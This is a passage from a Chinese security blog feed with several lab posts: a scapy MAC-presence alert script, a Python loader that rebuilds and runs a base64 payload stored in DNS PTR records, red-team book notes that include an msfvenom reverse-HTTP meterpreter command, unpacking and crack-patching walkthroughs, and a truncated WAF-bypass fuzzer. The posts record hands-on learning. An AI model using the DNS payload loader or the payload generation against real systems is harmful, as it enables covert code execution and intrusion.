alt="iBVHXT.png"><br>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>获取指定Mac地址上线</title>
      <link href="/posts/15535e9f.html"/>
      <url>/posts/15535e9f.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之所以有了这篇文章，是因为实验室里有了摄像头。害怕打鬼泣的时候被发现，所以就写了这个脚本<br><img src="https://s1.ax1x.com/2018/10/20/i0uk11.jpg" alt="i0uk11.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>思路：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用scapy模块获取局域网内的存活的Mac和IP地址</span><br><span class="line">当匹配到指定的Mac地址存在的话，那么摄像头可能就启动了</span><br><span class="line">发封邮件给自己邮箱</span><br></pre></td></tr></table></figure></p><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">from threading import Thread</span><br><span class="line">import re</span><br><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.header import Header</span><br><span class="line"></span><br><span class="line">xj=open(&apos;logo.txt&apos;,&apos;w&apos;)</span><br><span class="line">xj.close()</span><br><span class="line">user=input(&apos;Please IP,&gt;&quot;192.168.1/24&quot; --&gt;&apos;)</span><br><span class="line">user2=input(&apos;Please dst Mac --&gt;&apos;)</span><br><span class="line">macs=[]</span><br><span class="line">txs=[]</span><br><span class="line">def logo(lg):</span><br><span class="line">    print(lg,file=open(&apos;logo.txt&apos;,&apos;a&apos;))</span><br><span class="line">def scan(host,dstmac):</span><br><span class="line">    global dstmacs,dstips</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            ang,uag=srp(Ether(dst=&apos;FF:FF:FF:FF:FF:FF&apos;)/ARP(pdst=host),timeout=2) //发送一个包</span><br><span class="line">            for send,rcv in ang:</span><br><span class="line">                listMac=rcv.sprintf(&apos;Mac:%Ether.src%--IP:%ARP.psrc%&apos;) //获取存活Mac对应的IP地址</span><br><span class="line">                macs.append(listMac)</span><br><span class="line">                logo(&apos;Obtain Mac &#123;&#125;&apos;.format(listMac))</span><br><span class="line">        except Exception as a:</span><br><span class="line">            print(&apos;[-] Error &#123;&#125;&apos;.format(a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        for u in macs:</span><br><span class="line">            zz = re.findall(&apos;Mac:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]|IP:*.*.*&apos;,str(u))</span><br><span class="line">            cl=str(zz).replace(&apos;[&apos;,&apos;&apos;).replace(&apos;]&apos;,&apos;&apos;).replace(&apos;Mac:&apos;,&apos;&apos;).replace(&quot;&apos;&quot;,&apos;&apos;) //正则过滤</span><br><span class="line">            if dstmac in cl:</span><br><span class="line">                tx = 0</span><br><span class="line">                txs.append(tx)</span><br><span class="line">                print(&apos;[+] Match to the corresponding Mac address:&#123;&#125;&apos;.format(dstmac))</span><br><span class="line">                dstmacs=dstmac</span><br><span class="line">                zz2=re.findall(&apos;IP:*.*.*&apos;,str(cl))</span><br><span class="line">                for dstip in zz2:</span><br><span class="line">                    dp=str(dstip).replace(&apos;IP:&apos;,&apos;&apos;).strip()</span><br><span class="line">                    print(&apos;[+] The corresponding IP address is:&#123;&#125;&apos;.format(dp))</span><br><span class="line">                    logo(&apos;[+] The corresponding IP address is:&#123;&#125;&apos;.format(dp))</span><br><span class="line">                    dstips=dp</span><br><span class="line">            else:</span><br><span class="line">                logo(&apos;[-] No match to the corresponding Mac address.&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        for v in txs:</span><br><span class="line">            print(v)</span><br><span class="line">            if int(v)==0:</span><br><span class="line">                print(dstmacs,dstips)</span><br><span class="line">                emails(dstmacs,dstips)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">def emails(dstmacs,dstips): //发送邮箱</span><br><span class="line">    try:</span><br><span class="line">        username=&apos;**********&apos;</span><br><span class="line">        password=&apos;*******&apos;</span><br><span class="line">        messeng=MIMEText(&apos;警告：指定的Mac地址上线，老师可能来了。快不要玩游戏,Mac:&#123;&#125;,IP:&#123;&#125;&apos;.format(dstmacs,dstips),&apos;plain&apos;,&apos;utf-8&apos;)</span><br><span class="line">        messeng[&apos;From&apos;]=Header(&apos;警告信息&apos;,&apos;utf-8&apos;)</span><br><span class="line">        messeng[&apos;TO&apos;]=Header(&apos;422926799@qq.com&apos;,&apos;utf-8&apos;)</span><br><span class="line">        messeng[&apos;Subject&apos;]=Header(&apos;警告&apos;,&apos;utf-8&apos;)</span><br><span class="line">        smtp=smtplib.SMTP()</span><br><span class="line">        smtp.connect(&apos;smtp.sohu.com&apos;,&apos;25&apos;)</span><br><span class="line">        smtp.login(username,password)</span><br><span class="line">        smtp.sendmail(&apos;chinaanonymous@sohu.com&apos;,[&apos;422926799@qq.com&apos;],messeng.as_string())</span><br><span class="line">        smtp.quit()</span><br><span class="line">        print(&apos;[+] send email ok&apos;)</span><br><span class="line">        exit()</span><br><span class="line">    except Exception as r:</span><br><span class="line">        print(r)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    t=Thread(target=scan,args=(user.strip(),user2.strip()))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure></p><p>测试结果：<br><img src="https://s1.ax1x.com/2018/10/20/i0uA6x.md.png" alt=""></p><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PYTHON通过DNS协议传输后门</title>
      <link href="/posts/2726caf0.html"/>
      <url>/posts/2726caf0.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先吐槽一下，，做了一天护网杯的题发现一题也做不了。我擦。。。心情mmp，然后这个实验是在上学的时候在FB看到的。这里的我也实验了一遍就当做个记录<br><img src="https://s1.ax1x.com/2018/10/13/iNoicj.jpg" alt=""></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>先放出FB看的那篇文章吧</p><pre><code>转自Freebuf</code></pre><p>DNS后门与检测：<code>http://www.freebuf.com/articles/network/185324.html</code></p><p><strong>思路</strong></p><pre><code>这篇文章的主要思路是通过DNS的PTR记录存放payload然后，用python获取数据进行拼接payload。</code></pre><p>实现过程：</p><pre><code>需要环境：Windows server 2008 和 Kali1.首先用windows server 2008搭建好DNS服务</code></pre><p><img src="https://s1.ax1x.com/2018/10/13/iNoobq.png" alt=""></p><pre><code>2.创建数个PTR记录，放入payload,我这里将其进unicode编码</code></pre><p><img src="https://s1.ax1x.com/2018/10/13/iNob5T.md.png" alt=""></p><pre><code>3.写代获取payload并进行拼接，然后执行import osimport redef zx():    xj=open(&apos;zc.txt&apos;,&apos;w&apos;)    xj.close()    gl=[]    payload=[]    for r in range(101,176):        qq=os.popen(&apos;nslookup -qtr=ptr 192.168.89.{}&apos;.format(r)) #使用nslookup获得这段IP的ptr记录        zz=re.findall(&apos;name = .*&apos;,qq.read()) #正则进行过滤        for k in zz:            sc=str(k).replace(&quot;name = &quot;,&apos;&apos;)            gl.append(sc)    for z in gl:        dw=re.findall(&apos;[u][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z]&apos;,str(z))        for w in dw:            dwe=&apos;\\&apos;+w #在DNS中是没有斜杆的得自己手动加上            print(dwe,end=&apos;&apos;,file=open(&apos;zc.txt&apos;,&apos;a&apos;))    dk=open(&apos;zc.txt&apos;,&apos;r&apos;)    reads=dk.read()    exploit=reads.encode(&apos;utf-8&apos;).decode #编码成字符串 (&apos;unicode_escape&apos;)    mls=&quot;&quot;&quot;python -c &quot;exec(&apos;{}&apos;.decode(&apos;base64&apos;)){}&quot;&quot;&quot;.format(exploit,&apos;&quot;&apos;)    os.system(mls) #执行zx()</code></pre><p>测试结果如下：</p><p><img src="https://s1.ax1x.com/2018/10/13/iNT2e1.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/13/iNTRdx.png" alt=""></p><p>音乐：<embed src="//music.163.com/style/swf/widget.swf?sid=531925&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CreateSpace.Hacker3读书笔记（一）</title>
      <link href="/posts/7b745eec.html"/>
      <url>/posts/7b745eec.html</url>
      <content type="html"><![CDATA[<p>更新时间：2018.10.6 18:09<br>CreateSpace-Hacker3介绍<br>放假的时候会准时更新</p><p><img src="https://s1.ax1x.com/2018/10/06/iGC8E9.jpg" alt=""><br>用于介绍红队攻击的操作，我也是刚刚看哈。说错的麻烦指出了</p><p><b>渗透测试团队与红队</b></p><blockquote><p>这是红队开始发挥作用的地方。红队的任务是模仿对手的战术，技术和程序（TTP）。目标是提供关于公司如何应对的真实世界和事实，在安全计划中找到差距，确定员工内部的技能差距，并最终提高他们的安全态势。</p></blockquote><p>自己的理解：说白了红队介绍模仿hack攻击的手法，在合法的范围内。并且没有公告测试蓝色团队，从而确定员工内部人员的技能差距。最终达到的目的是提高员工的安全姿势。</p><p><img src="https://s1.ax1x.com/2018/10/06/iGCajO.png" alt=""></p><p><b>APT组和操作文档的运行列表</b></p><blockquote><p>此Google文档（<a href="http://bit.ly/2GZb8eW）会分解不同的可疑APT组及其工具集。这是一个有用的列表，我们作为红色Teamers来模拟不同的攻击。当然，我们可能不会使用报告中记录的相同工具，但我们可能会构建类似的工具来执行相同的操作。" target="_blank" rel="noopener">http://bit.ly/2GZb8eW）会分解不同的可疑APT组及其工具集。这是一个有用的列表，我们作为红色Teamers来模拟不同的攻击。当然，我们可能不会使用报告中记录的相同工具，但我们可能会构建类似的工具来执行相同的操作。</a></p></blockquote><p><a href="https://docs.google.com/spreadsheets/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/edit#gid=361554658" target="_blank" rel="noopener">APT Groups and Operations文档</a></p><pre><code>中国                通用名称   CrowdStrike IRL   卡巴斯基   SecureWorks公司  美国麦迪安网络安全公司  FireEye  赛门铁克  iSight摄像头  思科（Sourcefire / VRT&gt; Talos） Palo Alto Unit 42  其他名称 操作1  操作2  操作3  操作4  工具箱/恶意软件 评论组  评论熊猫  中国人民解放军第61398部队  TG-8223  APT 1  棕狐  第3组  GIF89A，ShadyRAT，上海集团，拜占庭坦桑尼亚  阴暗鼠  WebC2、饼干等APT 2 Putter Panda PLA单元61486 TG-6952 APT 2 Group 36 SearchFire MSUpdater这个威胁行为者以美国技术（通信、航天、航空）、研究、国防和政府部门的公司为目标，进行间谍活动。它使用的工具和基础设施与人民解放军61398部队重叠。UPS哥特熊猫TG-0110 APT 3 Buckeye UPS团队6Boyusec-广州Boyu信息技术有限公司秘密狐狸双击秘密狼射击，Pirpi，PlugX/Sogu，Kaba，Cookie Cutter，许多0天：IE，Firefox，Flash，SportLoader。在国防、建筑、技术和运输部门中妥协实体。直到2015，它主要集中在美国和英国实体，但后来转移到香港的“基于目标”。航空航天与国防；建筑与工程；能源；高科技；非营利；电信；交通；https://www.fire..com/blog/.-./2015/06/.-.-wolf-adobe-flash-zero-day.html http://www.secureworks.com/resources/blog/./.-group-0110-tar通过网络钓鱼获取制造业和金融组织IXESHE编号熊猫TG-2754(暂定)APT 12 BeeBus Calc小组22 DynCalc，深红铁，DNSCalc NYT 2012年10月-Etumbot，Riptide，Hightide，ThreeByte，Waterspout，Mswab，Gh0st，ShowNews，3001。这种威胁行为者针对的是日本、台湾和东亚其他地区的组织包括电子制造商和电信公司，用于间谍目的。http://www.crowdstrike.com/blog/whois-number-panda/http://www.computerworld.com/s/./9241577/The_China_hacker_group_the_._the_N.Y.Times_is_back_with_update_tools？分类分类号＝17APT 16 APT 16 ELMER后门：这种威胁行为者以日本和台湾的金融、技术、媒体和政府部门的实体为目标，危害这些实体。E本地Windows特权升级漏洞CVE-2015-1701。成功利用两个漏洞导致下载器（IRONHALO）或后门（ELMER）的交付。https://www.fire..com/blog/.-./2015/12/the_eps_awakens.html https://www.fire..com/blog/.-./2015/12/the-eps-awakens-part-2.html。隐藏Lynx Aurora Panda APT 17副犬隐藏Lynx Tailgater Team 8组公理，体育迷，温蒂伞（Winnti Umbrella）短暂水螅黑咖啡，WEBCnC，快乐大鼠，插头，木马。Naid，后门。Moudoor，后门。流浪者，后门。博达，木马。水龙头，ZxShell，Sakula，中国直升机政府，击败nse &amp;航空航天，工业工程，非政府组织http://www.fire..com/blog/./cyber-.its/2013/09/.-vice-dog-zero-day-cve-2013-3893-.-to-japanese-target.http://www.fire..com/blog/./cyber-.its/2013/11/.-ephem.-.-ie-zero-daylink-to-DePutydo-UsS-无盘方法周比炸毁熊猫PLA海军TG-0416 APT 18 HTTP浏览器、令牌控制、HcdLoader、PisLoader航空和国防；建筑与工程；教育；卫生与生物技术；高科技；电信；运输间谍在社区卫生破坏/107828 http://www..eshare.net/CrowdStrike/.-casts-.-you-.-an-.ersary-problem公理APT 17尾门小组72条狗鱼（i.se），副犬（i.se），温蒂伞SMN Winnti，Gh0st RAT，毒藤，HydraQ，Hikit，ZxShell，副犬，Derusbi，PlugX，HTRAN，HDRoot，F.，Timestomper Shell船员，在DCs http://securelist.com/blog/researc上使用“骨骼钥匙”。H／57585／WNNTI—FAQ—My-SE-THOST/HTTP://www. NOVETA.COM/FILES/5614/139/622/NoVeTaTyCytoSurvivyExcel摘要-PDF温蒂集团：邪恶熊猫，温蒂伞，AceHash，PlugX，Webshells，ZxShell深层熊猫，邪恶蜘蛛http://blog.trendmicro.com/trendlabs-security-./winnti-.ses-github/https://www.protectwise.com/blog/winnti-.-.-open-source.html壳牌船员深熊猫网络大师APT 19功夫小猫组13 Sh3llCr3w，粉红豹歌曲，OPM歌曲《黑客樱桃/萨库雷尔》，德鲁比，扫描框框架，包括中国斩波器，WCE公理http://cyber.s.net/wp-content/uploads/2013/06/Deep-Panda.pdf https://www.isight合作伙伴/COM/2015/07/TraveSCAPE-METIAL HOPENTHEEL -更新周JULY-29 TH/Naikon Lotus Panda PLA单元78020 Naikon APT 30萤火虫MsnMM Naikon照相机Shy RARSTONE，BACKSPACe，NETEAGLE，XSControl https://securelist.com/./publications/69953/the-naikon-apt/http://blog..。</code></pre><p><b>设置你的目标</b></p><blockquote><p>在您破坏第一个系统之前，您需要确定红色团队活动的范围。在许多渗透测试中，您将获得一个目标，并且您不断尝试进入该单一系统。如果出现问题，你会继续下一件事。没有脚本，您通常非常专注于该网络。</p></blockquote><pre><code>1.最终目标是什么？它只是APT检测？它是在服务器上获得一个标志？是从数据库中获取数据吗？或者只是获得TTD指标？2.是否有我们要的目标？3.你打算用什么技术？我们谈到了使用MITRE ATT和CK Matrix，但每个类别的确切技术是什么？4.Red Canary的团队提供了有关这些技术的详细信息。我强烈建议你花点时间仔细检查它们：http：//bit.ly/2H0MTZA客户希望您使用哪些工具？它会是像Metasploit，Cobalt Strike，DNS Cat这样的COTS攻击性工具吗？还是定制工具？</code></pre><p><b>搭建外网攻击环境</b></p><blockquote><p>在红队攻击前，你得安装好你的神兵利器来帮助你完成一次完美的攻击。而安装工具总是麻烦的。<a href=">https://github.com/trustedsec/ptf">PTF</a>可以帮助你快速的安装工具</p></blockquote><blockquote><p>项目地址：<a href="https://github.com/trustedsec/ptf" target="_blank" rel="noopener">https://github.com/trustedsec/ptf</a></p></blockquote><pre><code>sudo apt-get install gitgit clone https://github.com/trustedsec/ptf.gitcd ptf./ptfuse modules/exploitation/install_update_all use modules/intelligence-gathering/install_update_alluse modules/post-exploitation/install_update_alluse modules/powershell/install_update_alluse modules/vulnerability-analysis/install_update_all当然你也可以按照项目的那条命令一次性更新全部，这里我不推荐直接更新全部。因为你的VPS可能会爆掉</code></pre><p><img src="https://s1.ax1x.com/2018/10/06/iGPnIA.png" alt=""><br>安装完成后进入Pentes可以看见安装的工具，这里我只安装了部分的工具<br><img src="https://s1.ax1x.com/2018/10/06/iGPQRP.png" alt=""><br><b>下面是一些工具介绍</b><br>(这里我就直接从书上复制过来了)</p><pre><code>1.Metasploit框架 Metasploit Framework仍然是一个黄金标准工具，尽管它最初是在2003年开发的。这是由于原始创建者HD Moore以及支持它的非常活跃的社区。这个社区驱动的框架（https://github.com/rapid7/metasploit-framework/commits/master）似乎每天更新，包含所有最新的公共漏洞，后期开发模块，辅助模块等。2.混淆Meterpreter有效负载如果我们正在执行某些社交工程攻击，我们可能希望使用Word或Excel文档作为我们的交付机制。但是，一个潜在的问题是，我们可能无法包含Meterpreter有效负载二进制文件或让它从Web下载一个，因为AV可能会触发它。此外，一个简单的解决方案是使用PowerShell进行模糊处理：msfvenom --payload windows / x64 / meterpreter_reverse_http --format psh --outmeterpreter-64.ps1 LHOST = 127.0.0.1我们甚至可以将其提升到新的水平，并使用Unicorn（https://github.com/trustedsec/unicorn）等工具生成更多模糊的PowerShell Meterpreter有效负载，我们将在本书中详细介绍这些负载。3.Cobalt Strike 什么是钴罢工？它是后期开发，横向移动，隐藏在网络中和渗透的工具。Cobalt Strike并没有真正的漏洞利用，也没有用于通过最新的0天漏洞来破坏系统。如果您已经在服务器上执行代码或将其用作网络钓鱼活动负载的一部分，那么您真正看到其广泛的功能和强大功能。一旦您可以执行Cobalt Strike有效负载，它就会创建一个Beacon连接，返回命令和控制服务器。（网上有3.8破解版自行下载）4.Cobalt Strike Aggressor ScriptsCobalt Strike有许多人为Cobalt Strike项目做出贡献。Aggressor Script是一种脚本语言，适用于受可编写脚本的IRC客户端和机器人启发的Red Team操作和对手模拟。它的目的有两个：（1）您可以创建长时间运行的机器人模拟虚拟红队成员，与您并肩黑客攻击，（2）您也可以使用它来扩展和修改Cobalt Strike客户端到您的需要[https://www.cobaltstrike.com/aggressor-script/index.html]。例如，HarleyQu1nn汇集了一系列不同的攻击者脚本，用于您的后期利用：http：//bit.ly/2qxIwPE。5.PowerShell帝国Empire是一个后开发框架，包括纯PowerShell2.0 Windows代理和纯Python 2.6 / 2.7 Linux / OS X代理。它是以前的PowerShell Empire和Python EmPyre项目的合并。该框架提供了密码安全通信和灵活的架构。在PowerShell方面，Empire实现了运行PowerShell代理的能力，无需PowerShell.exe，可快速部署的后期开发模块，从关键记录器到Mimikatz，以及适应性通信以逃避网络检测，所有这些都包含在以可用性为中心的框架中[ https://github.com/EmpireProject/Empire。5.dnscat2此工具旨在通过DNS协议创建加密的命令和控制（C2）通道，这是几乎每个网络的有效隧道[https://github.com/iagox86/dnscat2]。通过DNS进行C2和渗透提供了一种很好的机制来隐藏您的流量，规避网络传感器并绕过网络限制。在许多限制性或生产环境中，我们遇到的网络要么不允许出站流量，要么受到严格限制/监控的流量。为了解决这些问题，我们可以使用像dnscat2这样的工具。我们关注dnscat2的原因是因为它不需要root权限并允许shell访问和exfiltration。在许多安全环境中，直接出站UDP或TCP受到限制。为什么不利用基础架构中已经内置的服务？许多受保护的网络包含用于解析内部主机的DNS服务器，同时还允许解析外部资源。通过为我们拥有的恶意域设置权威服务器，我们可以利用这些DNS解析来执行我们的恶意软件的命令和控制。6.p0wnedShell正如p0wnedShell的Github页面所述，这个工具是“用C＃编写的令人反感的PowerShell主机应用程序，它不依赖于powershell.exe，而是在powershell运行空间环境（.NET）中运行powershell命令和函数。它包含许多令人反感的PowerShell模块和二进制文件，使后期利用过程更加容易。我们尝试的是建立一个“一体化”的后开发工具，我们可以使用它来绕过所有缓解解决方案（或至少一些关闭），并且包含所有相关工具。您可以使用它在Active Directory环境中执行现代攻击，并在您的Blue团队中创建意识，以便他们可以构建正确的防御策略。“[https://github.com/Cn33liz/p0wnedShell]7.Pupy ShellPupy是“一个开源，跨平台（Windows，Linux，OSX，Android）远程管理和后期开发工具，主要用python编写。”[https://github.com/n1nj4sec/pupy]8.PoshC2PoshC2是“一个代理感知的C2框架，完全用PowerShell编写，以帮助渗透测试人员进行红色团队合作，后期开发和横向移动。这些工具和模块是在我们成功的PowerShell会话和Metasploit框架的有效负载类型的基础上开发的。PowerShell被选为基本语言，因为它提供了所需的所有功能和丰富的功能，而无需向框架引入多种语言。“[https://github.com/nettitude/PoshC2]9.梅林Merlin（https://github.com/Ne0nd0g/merlin）利用最近开发的名为HTTP / 2（RFC7540）的协议。Per Medium，“HTTP / 2通信是多路复用的，双向连接不会在一个请求和响应之后结束。此外，HTTP / 2是一个二进制协议，使其更紧凑，易于解析，并且不具备人类可读性使用口译工具。“[https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a#df21]Merlin是一个用GO编写的工具，外观和感觉类似于PowerShell Empire，并且允许使用轻量级代理。它不支持任何类型的后期开发模块，因此您必须自己完成。10.霓裳Nishang（https://github.com/samratashok/nishang）是一个脚本和有效负载的框架和集合，可以使用PowerShell进行攻击性安全，渗透测试和Red Teaming。Nishang在渗透测试的所有阶段都很有用。</code></pre><p>转载请声明转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BC++语言的PE脱壳</title>
      <link href="/posts/e1579f87.html"/>
      <url>/posts/e1579f87.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天晚上学习shark恒的教程的第一期第十四课，教的是脱BC++语言PE的壳子，也学到了脱壳要谨记的三件事。<br><img src="https://s1.ax1x.com/2018/10/06/iG9MTA.png" alt=""></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>这节课拿到的是一个Telnet连接器<br><img src="https://s1.ax1x.com/2018/10/06/iG9lFI.md.png" alt=""><br>还是先查壳<br><img src="https://s1.ax1x.com/2018/10/06/iG9tOg.md.png" alt=""></p><pre><code>Aspack v2.12 -&gt; Alexey Solodovnikov ( Sn-flag:ok )</code></pre><p>Aspack壳，将程序拖入OD（满足ESP定律脱壳操作）<br><img src="https://s1.ax1x.com/2018/10/06/iG9GSf.md.png" alt=""><br>(注：这里我不用恒大那么麻烦，直接OD脱掉就行了，OD会帮你自动寻找IAT，而且恒大那个办法我实验的时候转存出来的EXE有报错)<br>脱壳操作：<br>到达OEP<br><img src="https://s1.ax1x.com/2018/10/06/iG9spV.md.png" alt=""><br>从模块中删除分析<br><img src="https://s1.ax1x.com/2018/10/06/iG9cXF.png" alt=""><br>OD调试脱壳进程，保存EXE，软件也是打的开的<br><img src="https://s1.ax1x.com/2018/10/06/iG9W79.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/06/iG9hkR.png" alt=""><br>这个软件破解就不说了，搜索关键字找到跳转nop填充。。。<br>下面给出一些常见的OEP和区段信息</p><p>BC++的OEP<br><img src="https://s1.ax1x.com/2018/10/06/iG976O.png" alt=""></p><p>Delphi7的OEP<br><img src="https://s1.ax1x.com/2018/10/06/iG9qne.png" alt=""><br>V2008Release的区段信息<br><img src="https://s1.ax1x.com/2018/10/06/iG9O7d.png" alt=""><br>VB5的OEP<br><img src="https://s1.ax1x.com/2018/10/06/iG9vtI.png" alt=""><br>VB6的OEP<br><img src="https://s1.ax1x.com/2018/10/06/iGCS9P.png" alt=""><br>VC6和易语言的OEP<br><img src="https://s1.ax1x.com/2018/10/06/iGC9c8.png" alt=""><br>VS2008Debug区段信息和OEP<br><img src="https://s1.ax1x.com/2018/10/06/iGCing.png" alt=""><br>VS2012-VS2015Debug的OEP和区段信息<br><img src="https://s1.ax1x.com/2018/10/06/iGCk7j.png" alt=""><br>VS2012-VS2015Release的OEP和区段信息<br><img src="https://s1.ax1x.com/2018/10/06/iGCZhq.png" alt=""></p><p>总结：</p><pre><code>1.遇到壳的时候要先查壳，如果PEID查不出什么语言写的用DELE查2.然后查到什么语言后先去查OEP是怎么样的，不要OEP过了都不知道3.BC++壳脱完后要手动寻找IAT地址，不要认为是自效验</code></pre><p>转载请注明转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>去除Adobe要求更新的弹框</title>
      <link href="/posts/74113ec1.html"/>
      <url>/posts/74113ec1.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在看一些英文的PDF，边看边翻译实在是十分的不爽。后面百度发现一个办法使用Adobe8.1，将PDF当做html源码导出。然后用google浏览器打开翻译。<br><img src="https://s1.ax1x.com/2018/10/06/iGSg3T.png" alt=""></p><p>#正文#<br>其实方法不难，用到之前所说的F12暂停法就能去掉框框了。<br>首先查一下有没有壳子：<br><img src="https://s1.ax1x.com/2018/10/06/iGp3MF.png" alt=""><br>无壳子，载入OD。等待那个框框弹出来<br><img src="https://s1.ax1x.com/2018/10/06/iGpNI1.png" alt=""><br>按F12暂停<br><img src="https://s1.ax1x.com/2018/10/06/iGpDMD.png" alt=""><br>按菜单栏上的K找到MessageBoxExw右键显示调用，去到反汇编窗口，发现停在call这里。<br><img src="https://s1.ax1x.com/2018/10/06/iGphz8.png" alt=""><br>F2下段，重新运行程序，进行单步走出系统领空<br><img src="https://s1.ax1x.com/2018/10/06/iGpIsg.png" alt=""><br>回到程序领空<br><img src="https://s1.ax1x.com/2018/10/06/iGpHds.png" alt=""><br>然后寻找一个跳转已实现的je（要走出几个call才能找到）<br><img src="https://s1.ax1x.com/2018/10/06/iGpXWV.md.png" alt=""><br>对这个je进行下断，然后重新运行程序<br><img src="https://s1.ax1x.com/2018/10/06/iGpjzT.md.png" alt=""><br>发现是je搞的鬼，直接nop填充解决问题（要等他跳转已实现后在nop填充）<br><img src="https://s1.ax1x.com/2018/10/06/iG9SL4.png" alt=""><br>然后在运行程序就不会让卸载重装了<br><img src="https://s1.ax1x.com/2018/10/06/iG9PoR.png" alt=""><br>然后这里分享一个将PDF导出为html的操作：</p><pre><code>http://www.360doc.com/content/17/0408/12/40000899_643843420.shtml</code></pre><p>转载请声明转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>命令执行的时候绕过waf</title>
      <link href="/posts/5fc52f43.html"/>
      <url>/posts/5fc52f43.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>国庆第五天假期，才写了三篇博客。感觉有点不理想= =，这次写的是bypass命令执行，针对目标系统是windows的。<br><img src="http://img0.imgtn.bdimg.com/it/u=3304268035,1959556107&amp;fm=200&amp;gp=0.jpg" alt=""></p><p>音乐：<embed src="//music.163.com/style/swf/widget.swf?sid=451113443&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>思路：</p><pre><code>使用一些符号来对命令进行链接执行指定命令，通过从网页上获取指定关键字判断是否成功bypass</code></pre><p>代码：</p><pre><code>#这里只是拿DVWA做个例子#import requestsimport optparsedef main():    parser=optparse.OptionParser()    parser.add_option(&apos;-u&apos;,dest=&apos;zru&apos;,help=&apos;Used for fuzzy testing&apos;)    (options,args)=parser.parse_args()    if options.zru:        url=options.zru        fuzz(url)    else:        parser.print_help()        exit()def fuzz(url):cookies=&apos;PHPSESSID=70mpunbrle3mb6bfaiqieqf3p3;security=high&apos;cookie = {}for k in str(cookies).strip().split(&apos;;&apos;):    key, value = k.split(&apos;=&apos;, 1)    cookie[key] = 